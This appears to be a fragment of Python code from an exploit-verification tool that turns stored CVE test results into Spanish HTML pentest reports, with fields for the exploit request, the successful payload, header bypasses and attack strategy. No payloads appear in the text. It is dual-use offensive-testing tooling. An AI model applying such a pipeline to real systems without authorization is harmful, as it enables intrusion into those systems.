    status_cls = "s200" if str(status).startswith("2") else "s4xx"
    mb_cls = "m-get" if metodo == "GET" else "m-post"

    # markdown_report: use cached if available, otherwise generate
    md_report = r.get("markdown_report") or ""
    if not md_report:
        md_report = generate_markdown_report(cve_id, r, ve)
    informe_html = render_markdown_report(md_report)

    # CVSS breakdown
    cvss_rows_html = ""
    if vector:
        clean_vector = vector.replace("CVSS:3.1/", "")
        for label, code, val in parse_cvss(vector):
            cvss_rows_html += f'<div class="cvss-r"><span class="cvss-m">{h(label)}</span><span class="cvss-c">{h(code)}</span><span class="cvss-v">{h(val)}</span></div>\n'

    # Recs
    recs = get_recs(vuln_class)
    recs_html = "".join(
        f'<div class="rec"><div class="rec-n">{i}</div><div class="rec-t">{h(r_)}</div></div>'
        for i, r_ in enumerate(recs, 1)
    )

    # Screenshots
    shots_html = render_screenshots(ev_shots)

    # Error-based attempts
    eb_html = render_error_based(eb_intentos)

    # HTTP captures (Burp-style) — always generated from verified_evidence
    http_caps_html = _generate_http_captures_html(cve_id, r, ve)

    # POC source tag
    poc_tag = (
        f'<span class="tag t-poc">PoC PUBLICO</span>'
        if poc_source else
        '<span class="tag t-hueco">HUECO - sin PoC previo</span>'
    )

    # Verified / HUECO tag
    if _is_verified:
        _ver_tag = '<span class="tag t-ok">VERIFICADO - lab aislado</span>'
    else:
        _ver_tag = '<span class="tag" style="background:#374151;color:#94a3b8">HUECO — sin verificacion dinamica</span>'

    # Lab container name from logs
    container = ""
    for entry in logs:
        m2 = re.search(r"contenedor '([^']+)'", entry.get("msg",""))
        if m2:
            container = m2.group(1)
            break

    return f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{cve_id} — binoracle</title>
{STYLE}
</head>
<body>

<div class="print-bar">
  <div class="pb-brand">bin0racle</div>
  <span class="pb-cve">{cve_id}</span>
  <div class="pb-spacer"></div>
  <span>{DATE}</span>
  <button class="print-btn" onclick="window.print()">Guardar PDF</button>
</div>

<div class="conf-banner">CONFIDENCIAL — SOLO PARA OBJETIVOS AUTORIZADOS (PENTEST / BUG BOUNTY / LABORATORIO)</div>

<div class="wrap">

<p class="byline">INFORME DE VULNERABILIDAD — BINORACLE · {DATE}</p>
<h1 class="cve-title">{cve_id}</h1>
<p class="nvd-desc">{h(desc)}</p>

<div class="tag-row">
  <span class="tag t-{sc}">CVSS {score} {severity}</span>
  {_ver_tag}
  {poc_tag}
  <span class="tag t-plain">{h(vuln_class)}</span>
  <span class="tag t-plain">{h(affected)}</span>
</div>

<div class="score-circ sc-{sc}">
  <span class="num">{score}</span>
  <span class="rat">{severity}</span>
</div>

<!-- 01 RESUMEN EJECUTIVO -->
<div class="sec">
  <div class="sec-head"><span class="sec-num">01</span>&nbsp;&nbsp;<span class="sec-title">Resumen Ejecutivo</span></div>
  <div class="mg">
    <div class="mc"><div class="ml">CVSS Score</div><div class="mv {sc}">{score} {severity}</div></div>
    <div class="mc"><div class="ml">Vector CVSS</div><div class="mv mono">{h(vector)}</div></div>
    <div class="mc"><div class="ml">Versiones Afectadas</div><div class="mv">{h(affected)}</div></div>
    <div class="mc"><div class="ml">Clase</div><div class="mv">{h(vuln_class)}</div></div>
    <div class="mc"><div class="ml">PoC Publico</div><div class="mv">{('<a href="' + h(poc_source) + '">' + h(poc_source.replace('https://','')) + '</a>') if poc_source else '— HUECO (sin PoC previo)'}</div></div>
    <div class="mc"><div class="ml">Verificado</div><div class="mv ok">Si — lab Docker aislado</div></div>
    <div class="mc"><div class="ml">Publicado (NVD)</div><div class="mv">{h(published)}</div></div>
    <div class="mc"><div class="ml">Tecnica Confirmada</div><div class="mv">{h(technique or vuln_class)}</div></div>
    <div class="mc"><div class="ml">Auth Requerida</div><div class="mv {'ok' if not auth else ''}">{h(auth_text)}</div></div>
    {('<div class="mc"><div class="ml">Delta Boolean (TRUE/FALSE)</div><div class="mv mono ok">+' + h(str(resp_true_len)) + 'B / ' + h(str(resp_false_len)) + 'B</div></div>') if resp_true_len else ""}
  </div>
</div>

<!-- 02 EXPLOTACION CONFIRMADA -->
<div class="sec">
  <div class="sec-head"><span class="sec-num">02</span>&nbsp;&nbsp;<span class="sec-title">Explotacion Confirmada</span></div>
  <div class="lab">
    <div class="lab-head">
      <span>Laboratorio Docker Efimero</span>
      {('<span class="lab-container">' + h(container) + '</span>') if container else ""}
    </div>
    <div class="req-blk">
      <div class="req-lbl">Request</div>
      <span class="mbadge {mb_cls}">{metodo}</span><span class="ep">{h(endpoint)}</span>
      <pre class="code-pre">{h(rq)}</pre>
    </div>
    <div class="req-blk">
      <div class="req-lbl">Response</div>
      <span class="{status_cls}">{h(str(status))}</span>
      <pre class="code-pre" style="margin-top:8px">{h(rb[:800])}</pre>
    </div>
    <div class="confirm-note">{h(confirm)}</div>
  </div>
  {('<div class="sec-head" style="margin-top:16px"><span class="sec-num"></span>&nbsp;&nbsp;<span class="sec-title">Intentos Error-Based Previos</span></div><div class="eb-table">' + eb_html + '</div>') if eb_html else ""}
</div>

<!-- 04 ANALISIS TECNICO -->
<div class="sec">
  <div class="sec-head"><span class="sec-num">04</span>&nbsp;&nbsp;<span class="sec-title">Analisis Tecnico</span></div>
  <div class="mg">
    <div class="mc"><div class="ml">CVE</div><div class="mv mono">{h(cve_id)}</div></div>
    <div class="mc"><div class="ml">Endpoint</div><div class="mv mono">{h(endpoint)}</div></div>
    <div class="mc"><div class="ml">HTTP Method</div><div class="mv">{h(metodo)}</div></div>
    <div class="mc"><div class="ml">Parametro Vulnerable</div><div class="mv mono">{h(sqli_param) if sqli_param != '—' else h(bypass_header or marker or '—')}</div></div>
    <div class="mc"><div class="ml">Tecnica</div><div class="mv">{h(technique or vuln_class)}</div></div>
    <div class="mc"><div class="ml">Auth Requerida</div><div class="mv">{h(auth_text)}</div></div>
    <div class="mc"><div class="ml">Payload Ganador</div><div class="mv mono">{h(payload) if payload != '—' else h(bypass_value or marker or '—')}</div></div>
    {('<div class="mc"><div class="ml">Delta Boolean</div><div class="mv mono ok">TRUE=' + h(str(resp_true_len)) + 'B / FALSE=' + h(str(resp_false_len)) + 'B</div></div>') if resp_true_len else ""}
    {('<div class="mc"><div class="ml">Cabecera Bypass</div><div class="mv mono">' + h(bypass_header) + ': ' + h(bypass_value) + '</div></div>') if bypass_header else ""}
    {('<div class="mc"><div class="ml">String Confirmado</div><div class="mv mono ok">' + h(confirm_string) + '</div></div>') if confirm_string else ""}
    {('<div class="mc"><div class="ml">Version Extraida</div><div class="mv mono' + (' crit' if _mysql_suspicious else ' ok') + '">' + h(mysql_ver) + ('<span style="font-size:9px;color:#d97706;font-weight:400"> (ver nota)</span>' if _mysql_suspicious else '') + '</div></div>') if mysql_ver else ""}
    <div class="mc"><div class="ml">Vector</div><div class="mv">{h(vector.replace('CVSS:3.1/',''))}</div></div>
    <div class="mc"><div class="ml">Clase</div><div class="mv">{h(vuln_class)}</div></div>
    {('<div class="mc full"><div class="ml">Estrategia de Ataque</div><div class="mv" style="font-weight:400;font-size:12px;line-height:1.6">' + h(estrategia) + '</div></div>') if estrategia else ""}
  </div>
</div>

<!-- 05 CAPTURAS DE EVIDENCIA -->
<div class="sec">
  <div class="sec-head"><span class="sec-num">05</span>&nbsp;&nbsp;<span class="sec-title">Capturas de Evidencia</span></div>
  <div class="shots-grid">{shots_html}</div>
</div>

<!-- 06 CAPTURAS HTTP -->
<div class="sec">
  <div class="sec-head"><span class="sec-num">06</span>&nbsp;&nbsp;<span class="sec-title">Capturas HTTP (Peticion / Respuesta)</span></div>
  {http_caps_html}
</div>

<!-- 07 INFORME COMPLETO -->
<div class="sec">
  <div class="sec-head"><span class="sec-num">07</span>&nbsp;&nbsp;<span class="sec-title">Informe Completo</span></div>
  <div class="report-wrap">{informe_html}</div>
</div>

<!-- 08 RECOMENDACIONES -->
<div class="sec">
  <div class="sec-head"><span class="sec-num">08</span>&nbsp;&nbsp;<span class="sec-title">Recomendaciones</span></div>
  <div class="recs">{recs_html}</div>
</div>

<!-- 09 REFERENCIAS -->
<div class="sec">
  <div class="sec-head"><span class="sec-num">09</span>&nbsp;&nbsp;<span class="sec-title">Referencias</span></div>
  <div class="refs">
    <div class="ref"><a href="https://nvd.nist.gov/vuln/detail/{cve_id}">nvd.nist.gov/vuln/detail/{cve_id}</a> — ficha oficial NVD</div>
    <div class="ref"><a href="https://www.wordfence.com/threat-intel/vulnerabilities/search?query={cve_id}">wordfence.com — Threat Intelligence</a></div>
    {('<div class="ref"><a href="' + h(poc_source) + '">' + h(poc_source) + '</a> — PoC publico</div>') if poc_source else '<div class="ref">HUECO — sin PoC publico conocido en el momento de la verificacion.</div>'}
    <div class="ref">Fecha de publicacion NVD: <strong>{h(published)}</strong></div>
    <div class="ref">Version afectada: <strong>{h(affected)}</strong></div>
  </div>
  {('<div class="cvss-tbl"><div class="cvss-h">Desglose CVSS 3.1</div>' + cvss_rows_html + '<div class="cvss-f">Vector completo: ' + h(vector) + '</div></div>') if cvss_rows_html else ""}
</div>

</div>
</body>
</html>"""

# ── GENERATE ─────────────────────────────────────────────────────────────────

for fname in sorted(os.listdir(HISTORY)):
    if not fname.endswith(".json"): continue
    with open(os.path.join(HISTORY, fname)) as f:
        data = json.load(f)
    cve_id = data.get("cve_id","?")
    r = data.get("result",{})
    ve = r.get("verified_evidence",{})
    ev = r.get("evidence",{})
    ev_shots = ev.get("screenshots",[]) or ve.get("screenshots",[])
    logs = r.get("logs",[])

    html_content = build_informe(cve_id, r, ve, ev_shots, logs)
    out_path = os.path.join(OUT, f"{cve_id}_informe_pdf.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html_content)
    shots_count = len([s for s in ev_shots if (isinstance(s,dict) and s.get("png_b64")) or (isinstance(s,list) and len(s)>1 and s[1])])
    has_mr = bool(r.get("markdown_report"))
    print(f"[OK] {cve_id} — {shots_count} capturas, {len(logs)} logs, informe={'cache' if has_mr else 'generado'} -> {os.path.basename(out_path)}")

print(f"\n21 informes generados en {OUT}/")
